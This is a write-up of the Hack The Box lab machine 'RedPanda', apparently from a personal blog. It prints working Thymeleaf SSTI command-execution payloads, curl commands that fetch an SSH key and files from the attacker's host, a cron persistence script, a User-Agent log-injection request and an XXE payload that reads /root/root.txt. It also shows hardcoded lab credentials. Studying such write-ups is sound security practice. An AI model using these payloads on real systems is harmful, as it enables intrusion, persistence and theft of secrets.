+++
title = "Hack The Box - RedPanda"
tags = [
    "ctf"
]
date = "2022-08-30"
toc = true
+++

# Premise

RedPanda is a `machine` challenge that presents the attacker with a web app displaying cute pictures of Red Pandas. Adorable. The goal, as usual, is to find both user and root flags. This is done through a combination of SSTI and XXE, and admittedly is one of the most difficult challenges that I've completed so far... despite being on the "easy" end of the spectrum.

Notes in this writeup will be a bit more freeform than others as I think sharing the overall approach I took may be of interest. From talking to others who have completed the challenge, I probably took a strange path.

# Recon

The machine doesn't respond to ICMP, which had me questioning my VPN connection, but this is intentional. Need to use `-Pn` with `nmap` to scan despite this.

- 22 and 8080 open
- 22 is ssh
- 8080 is a spring boot app

`ffuf` suggests there are /search, /stats, and /error endpoints. `/stats` gives us some other paths to look at

There's a hint on the `greg` page that there's an injection possible somewhere. The stats pages also have an export capability that will dump XML - possible a vector here if we're able to upload content somehow? Doesn't look like there's an endpoint for that.

The author search is a parameterized URL. Smells like a job for `sqlmap`, though in the end it doesn't think it's injectable even with max level risk, so this was a dead end.

Nikto is noting that the server allows other methods that could be fun:

```
OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
```

This may be a false positive though as none of the endpoints I can hit (including root) actually return these with an OPTIONS call. Apparently this is just a weird thing with spring boot and may be worth ignoring

There appears to be some form of filtering for the search as the `_` character is "banned", and we can throw a 500 by searching for `\`. The search allows us to do partials, so we can go by each letter and see what we get back. For example `e` will return `smiley` as one of the results. This gives us lots of cute pandas, but nothing actionable.

Input does seem to be sanitized for what's returned, so no XSS or obvious sqli. Stats _might_ have something injectable but as noted above, no real luck with it...

And after some more poking at this... WE HAVE SSTI! - `*{7*7}` - some examples of different prefixes @ https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/ in `hacking thymeleaf` heading. https://github.com/VikasVarshney/ssti-payload is also an excellent tool to generate these payloads.

- Note from future me: This level of encoding was entirely unneeded, but it did work and since I could easily build the encoded string with a script I just ran with it. Obfuscation is a good skill, right? :P

Here's an example SSTI we can use to do a whoami:

```
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(119).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105))).getInputStream())}
```

and uname -a:

```
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(117).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(97))).getInputStream())}
```

We can use this to get our user flag:

```
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(116))).getInputStream())}
```

Do they have an ssh key we can pull? Doesn't look like it... but we could probably generate one.

Let's try an encoded version of `ssh-keygen -b 2048 -t rsa -f /tmp/sshkely -q -N ""`:

```
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(115).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(110)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(48)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(114)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(102)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(113)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(34)).concat(T(java.lang.Character).toString(34))).getInputStream())}
```

Yep, that works. Now let's get the public key, and cat it into our authorized keys... so same deal as above, but need to create our `.ssh` dir first.

This will probably work, but getting errors with the private key we can leak. Let's try adding my own public key to the remote authorized_keys. We'll probably need to do this by setting up a webserver with python to serve an authorized_keys file we've created, pull it down with curl, and then update perms. Echoing a string with redirects gets filtered.

Bingo - `woodenk@redpanda:~$ `

Commands we used or encoded:

```
cp ~/.ssh/id_rsa.pub authorized_keys
python3 -m http.server
# encode and send the rest to remote server
mkdir /home/woodenk/.ssh
curl http://<vpn_ip>:8000/authorized_keys -o /home/woodenk/.ssh/authorized_keys
chmod -R 0700 /home/woodenk/.ssh
chown -R woodenk:woodenk /home/woodenk/.ssh
```

# Let's get to the root of the problem

Looks like we have a few processes running as `root` but `sudo`ing the execution as `woodenk`... cron job?:

```
root         878  0.0  0.0   2608   536 ?        Ss   Jul30   0:00 /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
root         879  0.0  0.2   9420  4576 ?        S    Jul30   0:00 sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
```

Yep

```
root         860  0.0  0.1   6812  3008 ?        Ss   Jul30   0:00 /usr/sbin/cron -f
root         863  0.0  0.1   8356  3404 ?        S    Jul30   0:00  \_ /usr/sbin/CRON -f
root         878  0.0  0.0   2608   536 ?        Ss   Jul30   0:00      \_ /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
root         879  0.0  0.2   9420  4576 ?        S    Jul30   0:00          \_ sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
woodenk      884 10.2 30.7 3140528 623772 ?      Sl   Jul30  10:10              \_ java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
```

We can't write to `root`'s `crontab`, nor do we have permissions to modify the jar file noted above. One thing that will be useful for us shortly is that the uncompiled Java code for all of the applications in use for the challenge is available on the box. While it's certainly possible to decompile the running `jar`s (and needing to do so would have been an evil twist...), we have everything we need for some whitebox analysis at this point.

There's a `cleanup.sh` in `/opt/` that uses find and executes an rm against what it finds. Maybe there's a way to exploit this with a fishy filename? Come back to this, not an obvious path.

We have some hardcoded creds for MySQL in the source for the app under `/opt/panda_search/src/`:

```
conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
```
Note: This is the user password for the OS as well, so we can use it for SSH!

Creds are valid, but the data is useless to us - it's the same stuff we saw about pandas in a browser... but... could we add a panda and have the image be the flag? Probably not, but let's try... The insert works and we can see it in the portal, but the path doesn't resolve as it just comes relative to the website and is passed in verbatim. MySQL is also smart and locks us in as the same user - woodenk - so no priv esc here.

# I `pspy` with my little eye

```
2022/07/31 15:06:01 CMD: UID=0    PID=1443   | /usr/sbin/CRON -f 
2022/07/31 15:06:01 CMD: UID=0    PID=1444   | /bin/sh -c /root/run_credits.sh 
2022/07/31 15:06:01 CMD: UID=0    PID=1446   | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar 
2022/07/31 15:06:01 CMD: UID=0    PID=1445   | /bin/sh /root/run_credits.sh 
...
2022/07/31 15:10:01 CMD: UID=0    PID=1601   | /bin/sh /root/run_credits.sh 
2022/07/31 15:10:01 CMD: UID=0    PID=1600   | /bin/sh -c /root/run_credits.sh 
2022/07/31 15:10:01 CMD: UID=0    PID=1604   | /bin/sh /root/run_credits.sh 
2022/07/31 15:10:01 CMD: UID=0    PID=1603   | sudo -u woodenk /opt/cleanup.sh 
2022/07/31 15:10:01 CMD: UID=0    PID=1602   | /bin/sh -c sudo -u woodenk /opt/cleanup.sh 
2022/07/31 15:10:01 CMD: UID=0    PID=1605   | /usr/bin/systemd-tmpfiles --clean 
2022/07/31 15:10:01 CMD: UID=1000 PID=1621   | /usr/bin/find /tmp -name *.xml -exec rm -rf {} ; 
2022/07/31 15:10:01 CMD: UID=0    PID=1620   | /lib/systemd/systemd-udevd 
2022/07/31 15:10:01 CMD: UID=1000 PID=1619   | /bin/bash /opt/cleanup.sh 
2022/07/31 15:10:01 CMD: UID=0    PID=1622   | /lib/systemd/systemd-udevd 
2022/07/31 15:10:01 CMD: UID=1000 PID=1625   | /bin/bash /opt/cleanup.sh 
2022/07/31 15:10:01 CMD: UID=0    PID=1633   | /lib/systemd/systemd-udevd 
2022/07/31 15:10:01 CMD: UID=1000 PID=1635   | /usr/bin/find /var/tmp -name *.jpg -exec rm -rf {} ; 
2022/07/31 15:10:01 CMD: UID=1000 PID=1636   | /usr/bin/find /dev/shm -name *.jpg -exec rm -rf {} ; 
2022/07/31 15:10:01 CMD: UID=1000 PID=1637   | /usr/bin/find /home/woodenk -name *.jpg -exec rm -rf {} ; 

```

Maybe we could do something with this? I doubt we can read the file, but worth a try in a bit. Looks like this may run every 2 minutes... Worst case we should be able to review what LogParser does.

Confirming we can't read the stuff from root's dir, but let's see what logparser does. AFAICT this is the overall flow:

- Open the log file at `/opt/panda_search/redpanda.log`
- Parse the log looking for _A LINE_ (the whole line) that conatins `.jpg`
- If the line contains a `.jpg` reference, parse with the following logic:

```
    public static Map parseLog(String line) {
        String[] strings = line.split("\\|\\|");
        Map map = new HashMap<>();
        map.put("status_code", Integer.parseInt(strings[0]));
        map.put("ip", strings[1]);
        map.put("user_agent", strings[2]);
        map.put("uri", strings[3]);
        

        return map;
    }
```
- Get the artist metadata:

```
            System.out.println(parsed_data.get("uri"));
            String artist = getArtist(parsed_data.get("uri").toString());
```

```
    public static String getArtist(String uri) throws IOException, JpegProcessingException
    {
        String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
        File jpgFile = new File(fullpath);
        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
        for(Directory dir : metadata.getDirectories())
        {
            for(Tag tag : dir.getTags())
            {
                if(tag.getTagName() == "Artist")
                {
                    return tag.getDescription();
                }
            }
        }

        return "N/A";
    }
```

Note: Can we put our payload in the image metadata? :thinking:

- Dump the output to an XML file:

```
            System.out.println("Artist: " + artist);
            String xmlPath = "/credits/" + artist + "_creds.xml";
            addViewTo(xmlPath, parsed_data.get("uri").toString());
```

Current line of thinking is that we might be able to abuse the Artist jpg metdata to create a bogus path and write out our root flag since this process should have access to it. We're no longer limited by the database varchar size limit on the artist name, which should come in handy.

Our URI _does_ need to be a jpg file, but with how this is formed (a filesystem path) we might be able to store this in a location we control. So the overall steps might be something like:

- Create an image with malicious Artist metadata
- Send a request to that image through a forged database entry that associates it with a panda
- This then writes out a log file in /credits/ with a name we control...
- Can we then abuse `find` to run this? Hmmm...

Reading through some XXE notes, we may be able to leverage a new entity in the file we control to inject a filepath for it to return in the output, in a field we arbitrarily name.

Since we know this is writing to a file location that we can control, and we know that when that file is then read by the other process it must have an author of `woodenk` or `damian`... 

```
      System.out.println("Exporting xml of: " + author);
      if(author.equals("woodenk") || author.equals("damian"))
      {
          InputStream in = new FileInputStream("/credits/" + author + "_creds.xml");
          System.out.println(in);
          return IOUtils.toByteArray(in);
      }
      else
      {
          return IOUtils.toByteArray("Error, incorrect paramenter 'author'\n\r");
      }
  }
```

# WWF? WWE? WCW? Nah... XXE!

Can we do something like this?

- Get an arbitrary image
- Update it with exiftool `exiftool -Artist="../home/woodenk/pwn' <image>.jpg`
  - Note that we need the .. here as it's going to resolve relative to `/credits/` as seen earlier
- Upload that file to `/home/woodenk`
- Create our XXE injection with something based on the actual XML output...

```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY injection SYSTEM "file:///root/root.txt"> ]>
<credits>
<author>woodenk</author>
<image>
<uri>/../../../../../../../../home/woodenk/panda.jpg</uri>
<pwn>&injection;</pwn>
<views>1</views>
</image>
</credits>
```
- Save this file to `/home/woodenk/pwn_creds.xml` so that we can request it when the artist is evaluated and we get our path
  - Note, this way it's going to be used by `addViewTo` in the log parser...
- Since we're associating this with another author (woodenk for example) we may get the injection output in that export? Somehow?
 
But how will we request this image in the first place? Can we use SQLi to point a URI to it?

Also note that both this image and the xml file are going to get deleted, often, so we need to figure out some persistence. I'm thinking a cron job that'll run a _script_ out of /dev/shm that'll download these from my host every minute and dump into /home/woodenk

Placed this script in /dev/shm/foo.sh, and set up cron job to run every minute

```
remote="10.10.14.10:8000"
curl http://$remote/panda.jpg -o /home/woodenk/panda.jpg
curl http://$remote/pwn_creds.xml -o /home/woodenk/pwn_creds.xml
```

```
remote="10.10.14.10:8000"
curl http://$remote/panda.jpg -o /home/woodenk/panda.jpg
curl http://$remote/pwn_creds.xml -o /home/woodenk/pwn_creds.xml
```
Now we sit back and wait to see if it works... Yep, this works for persistence, now let's figure out how to request this damn file in the first place...

As far as I can tell, we need to send a request but we can't hit that URI...

Fortunately the log parsing is "dumb" and is looking at positional locations based on a delimieter we know... `||` as seen in `App.java`:

```
    public static Map parseLog(String line) {
        String[] strings = line.split("\\|\\|");
        Map map = new HashMap<>();
        map.put("status_code", Integer.parseInt(strings[0]));
        map.put("ip", strings[1]);
        map.put("user_agent", strings[2]);
        map.put("uri", strings[3]);
        

        return map;
    }
```

Can we override the user agent and just send _any_ request?

`curl http://10.129.73.208:8080/ -H "User-Agent: ||/../../../../../../../../home/woodenk/panda.jpg"`

Let's spam this and see what happens... Also going to back off cron job to every 5 min so I don't clobber my own output. No luck yet. Time for a break and come back fresh.

I just needed to be patient :) Approach above works! Had to wait for background jobs to all run on cron. That lag I noted earlier about the export info being updated is real and almost threw me off course here.

GG!
